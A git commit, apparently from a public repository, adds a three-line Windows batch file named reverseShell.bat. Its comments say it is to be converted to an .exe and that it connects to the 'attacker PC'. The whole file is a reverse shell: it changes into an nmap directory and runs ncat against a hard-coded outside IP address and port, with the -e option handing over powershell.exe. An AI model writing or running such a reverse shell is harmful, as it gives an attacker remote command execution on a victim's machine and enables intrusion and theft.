2fc84bf378db1f9b8626953fecfae45bef8628a7
p1mpus <45327810+p1mpus@users.noreply.github.com>
2022-08-28 20:43:31 +0300

    Add files via upload

---
+++ reverseShell.bat
@@ -0,0 +1,3 @@
+#This script has to be converted to .exe file
+cd C:\Users\Public\Documents\nmap\nmap-7.92 #Go to netcat directory
+./ncat 62.217.176.87 6969 -e powershell.exe #Connect to attcker PC
